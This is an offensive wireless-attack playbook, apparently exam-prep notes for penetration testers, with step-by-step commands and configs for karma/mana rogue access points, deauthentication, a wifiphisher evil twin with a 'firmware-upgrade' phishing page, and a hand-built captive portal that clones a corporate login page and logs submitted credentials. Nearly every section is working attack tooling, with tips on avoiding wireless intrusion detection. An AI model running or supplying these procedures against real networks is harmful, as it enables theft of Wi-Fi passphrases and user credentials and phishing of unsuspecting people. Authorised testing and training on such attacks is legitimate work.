# Wireless - Rogue APs, karma and captive portals

## Karma: answering every probe request

**Trigger:** Clients are probing for network names that no AP in range is advertising, or you cannot reach the real AP but its clients are within range.

Clients carry a preferred-network list and many actively shout for each remembered name rather than waiting to hear a beacon, which both leaks the device's history and hands you a target list. A karma-style rogue AP answers yes to whatever name is probed, so it becomes an instant twin of a trusted network without you ever knowing that name in advance — no beacon spoofing of a specific SSID is required. The highest-yield case is a name nobody is advertising: if a client probes for an ESSID whose AP is powered down, out of range or decommissioned, you have no legitimate competitor and the client will associate with you on signal strength alone. Harvest the probe list first from the airodump PROBE column or by filtering probe requests in Wireshark, so you know which names the population trusts and whether any are open. `mana_loud` controls whether you retransmit every known beacon to every client: loud makes association far more likely and is the right default when you are trying to prove the attack works, quiet is for when you are trying not to light up a wireless IDS. This also defeats hidden SSIDs, because a client probing by name reveals what the AP declines to broadcast.

```bash
# 1. Harvest the preferred-network lists
sudo airodump-ng wlan0mon -w probes --output-format pcap,csv
tshark -r probes-01.cap -Y "wlan.fc.type_subtype == 0x04 && wlan.ssid != \"\"" \
  -T fields -e wlan.sa -e wlan.ssid | sort -u

# 2. Randomise the AP interface MAC first — a stale cloned BSSID collides
sudo macchanger -r wlan1

# 3. Karma AP that answers everything
cat > karma.conf <<'EOF'
interface=wlan1
driver=nl80211
hw_mode=g
channel=1
ssid=Anything
enable_mana=1
mana_loud=1
EOF
sudo hostapd-mana karma.conf
#   MANA - Directed probe request for SSID 'CorpWiFi-INT' from 86:d6:c5:ca:58:5e
```

Source: offsecexams.com OSWP cheatsheet; HTB Academy, Attacking Corporate Wi-Fi Networks — Performing Karma & Mana Attack

## Trial-and-error on the authentication type a probing client expects

**Trigger:** A client probes for a network whose AP is offline, and you do not know whether that network was open, PSK or enterprise.

A probe request carries the network's name and nothing about how it authenticated, so when the real AP is gone there is no way to read the answer off the air — you have to offer an authentication type and watch what the client does. Work through them in order and read the log for the specific signal each produces. Start with WPA2-PSK and a junk passphrase: if the client was configured for PSK it will associate, attempt the four-way handshake and fail, which `hostapd` reports as `AP-STA-POSSIBLE-PSK-MISMATCH` — and that failure is itself a win, because messages one and two crossed and you now hold a half-handshake to crack. If the client authenticates at the 802.11 layer but never produces that message, it is not using PSK for that network, and the next thing to try is enterprise. Under WPA-EAP you will see `CTRL-EVENT-EAP-STARTED` and an identity in the clear, at which point the attack becomes the enterprise credential capture. If neither produces anything, offer an open network, which some devices will join silently. The ordering matters because each attempt costs a rebuild and a reconnection window, and PSK is both the most common and the one whose failure still yields crackable material.

```bash
# Attempt 1 — WPA2-PSK with a junk key
cat > try-psk.conf <<'EOF'
interface=wlan1
driver=nl80211
hw_mode=g
channel=1
ssid=CorpWiFi-INT
wpa=2
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP CCMP
wpa_passphrase=Anything
enable_mana=1
mana_loud=1
EOF
sudo hostapd-mana try-psk.conf

#   AP-STA-POSSIBLE-PSK-MISMATCH   -> PSK network; half-handshake captured, crack it
#   authenticated, then silence     -> not PSK; try enterprise
#   nothing at all                  -> wrong channel, or the client is not in range

# Attempt 2 — enterprise. Full config: wpa-enterprise-evil-twin.md
# Attempt 3 — open. Then: open-and-guest-networks.md
```

Source: HTB Academy, Attacking Corporate Wi-Fi Networks — Performing Karma & Mana Attack

## Evil twin with a phishing portal, validated against a real handshake

**Trigger:** The passphrase resisted offline cracking but the network has active users.

When the key is strong, stop attacking the crypto and attack the user: stand up a twin, deauthenticate clients off the real AP so they reconnect to yours, and serve a page that asks for the passphrase or for credentials. The detail that makes this an assessment rather than a guess is the oracle — capture a genuine four-way handshake from the legitimate AP *before* you start, and feed it to the tool, so that anything a victim types can be verified against it immediately. Without the oracle you collect strings and cannot tell which one is real; with it, the tool tells you the moment the correct passphrase arrives and you can stop. `wifiphisher` packages the whole flow and its `firmware-upgrade` template is the most effective in practice because a device prompting for a router firmware update explains why the network dropped, which is exactly the event the victim just experienced. It needs two radios, one for the AP and one for the deauthentication, and it needs port 53 free — `systemd-resolved` holds it by default and the failure to stop that service is the usual reason the tool aborts on launch. Restore the services afterwards or the host stays offline.

```bash
# 0. Oracle: a real handshake from the legitimate AP
sudo airodump-ng -w portalcap -c 1 --bssid FE:E1:DE:CE:A5:E1 wlan0mon
sudo aireplay-ng -0 5 -a FE:E1:DE:CE:A5:E1 wlan0mon

# 1. Free port 53
sudo netstat -tulpan | grep :53
sudo systemctl stop systemd-resolved

# 2. Rogue AP + portal, with the handshake as the validator
sudo wifiphisher -aI wlan1 -eI wlan2 -p firmware-upgrade \
  --handshake-capture portalcap-01.cap -kN
#   -aI  interface hosting the rogue AP
#   -eI  interface performing the deauthentication
#   -p   phishing template
#   -kN  do not kill NetworkManager

# Other templates: oauth-login, wifi_connect, plugin_update

# 3. Restore
sudo systemctl restart NetworkManager systemd-resolved
```

Source: HTB Academy, Attacking Corporate Wi-Fi Networks — Attacking WPA2 Wi-Fi Network; offsecexams.com OSWP cheatsheet

## Building the captive portal by hand

**Trigger:** You need a portal the packaged tools do not provide, or `wifiphisher` will not run on your platform.

The infrastructure behind a captive portal is four pieces on the AP interface and understanding them separately is what lets you debug it when a packaged tool fails silently. You need an address on the segment so clients have a gateway; a DHCP and DNS server that resolves every domain to you, which is what makes any URL the victim types land on your page; a firewall redirect that captures DNS from clients that hardcode their own resolver, because a device pointed at 8.8.8.8 otherwise escapes your DNS entirely; and a web server hosting the cloned page with a handler that logs submissions. The piece people miss is the operating-system connectivity check: Windows, Android, iOS and macOS each probe a specific well-known URL after joining a network and decide from the response whether the network is "open" or "behind a portal", and answering those probes wrongly is precisely what makes the client pop its captive-portal browser window automatically. That automatic window is the entire delivery mechanism — without it the victim has to open a browser and navigate somewhere on their own. Watch the web server's access log live rather than waiting to check the credential file.

```bash
# 1. Clone the target login page
wget -r -l2 https://portal.corp.local
sudo cp -r ./portal.corp.local/* /var/www/html/portal    # + a handler that logs POSTs

# 2. Addressing on the AP interface
sudo ip addr add 192.168.87.1/24 dev wlan1 && sudo ip link set wlan1 up

# 3. DHCP + wildcard DNS
cat > dnsmasq.conf <<'EOF'
interface=wlan1
dhcp-range=192.168.87.10,192.168.87.200,12h
dhcp-option=3,192.168.87.1
dhcp-option=6,192.168.87.1
address=/#/192.168.87.1
# OS connectivity checks — answering these triggers the portal popup
address=/dns.msftncsi.com/131.107.255.255
address=/connectivitycheck.gstatic.com/192.168.87.1
address=/captive.apple.com/192.168.87.1
EOF
sudo dnsmasq --conf-file=dnsmasq.conf -d

# 4. Force hardcoded resolvers back to us
sudo nft add table ip nat
sudo nft 'add chain ip nat PREROUTING { type nat hook prerouting priority dstnat; policy accept; }'
sudo nft add rule ip nat PREROUTING iifname "wlan1" udp dport 53 counter redirect to :53

# 5. Serve and watch
sudo a2enmod rewrite alias && sudo systemctl restart apache2
sudo hostapd -B hostapd.conf
sudo tail -f /var/log/apache2/access.log
```

Source: offsecexams.com OSWP cheatsheet

## Choosing among the packaged rogue-AP frameworks

**Trigger:** You want a portal or MiTM flow without hand-building it, and need to pick a tool.

Four frameworks cover this space and they differ in what they automate rather than in what they can achieve. `wifiphisher` is the most complete for phishing specifically: templates, automatic deauthentication, handshake validation, and a built-in DHCP/DNS stack, at the cost of wanting control of your interfaces. `wifipumpkin3` is the better choice when you want the rogue AP as a MiTM platform rather than a phishing page — it has a plugin architecture with sniffers, proxies and credential capture modules and behaves more like a framework you script. `airgeddon` is a menu-driven wrapper over the whole aircrack toolchain including evil twin and WPS, which makes it useful for working quickly through a fleet but hides what it is doing, so it is a poor tool to learn from and an awkward one to debug. `fluxion` is narrowly focused on the handshake-validated portal attack and does that one flow well. For enterprise networks none of these is the right answer — `eaphammer` and `hostapd-mana` are the tools that speak 802.1X. The practical rule is to hand-build once so you know what each layer does, then use a framework for speed.

```bash
# wifipumpkin3 — rogue AP as a MiTM platform
sudo wifipumpkin3
#   set interface wlan1
#   set ssid CorpWiFi
#   proxies set noproxy
#   start

# airgeddon — menu-driven wrapper, fast across a fleet
sudo bash airgeddon.sh

# fluxion — handshake-validated portal
sudo ./fluxion.sh

# Enterprise networks: neither of the above speaks 802.1X.
#   -> wpa-enterprise-evil-twin.md
```

Source: HTB Academy, Attacking Corporate Wi-Fi Networks — Attacking WPA2 Wi-Fi Network; operator practice

## Why a rogue AP attracts nothing

**Trigger:** The AP is running, clients are present, and nothing associates.

Five causes account for nearly all of it. **Wrong channel** — clients scan all channels but associate preferentially to strong signals, and if you cloned the target BSSID you were forced onto a different channel, which makes you a weaker candidate. **Losing the signal contest** — a client stays with the real AP unless yours is meaningfully stronger, which is a physical problem solved by moving closer to the client or using a better antenna, not by configuration. **PMF on the real network** — your deauthentication is being rejected so nothing is being pushed toward you, and you have to win on signal alone. **MAC collision** — you cloned the BSSID and put your AP on the same channel as the real one, so the two radios interfere and neither works properly. **Stale MAC** — the interface still carries a cloned BSSID from a previous attack, which collides with that earlier target instead. Check them in that order, and verify your own AP is actually on the air by scanning for it from a second radio rather than trusting that `hostapd` printed `AP-ENABLED`.

```bash
# Is your AP actually beaconing? Check from a different radio.
sudo airodump-ng wlan2mon --essid "CorpWiFi"

# Signal comparison — yours must beat the real AP at the client's position
sudo airodump-ng wlan0mon --essid "CorpWiFi"      # compare the PWR column

iwconfig wlan1                                     # channel and mode of the rogue AP
macchanger -s wlan1                                # stale cloned BSSID?
sudo macchanger -r wlan1                           # reset between attacks

# Cloned BSSID -> different channel from the real AP, or the radios collide
# PMF required on the real AP -> deauth steering unavailable; move closer instead
```

Source: HTB Academy, Attacking Corporate Wi-Fi Networks — Attacking WPA3 Wi-Fi Network; operator practice
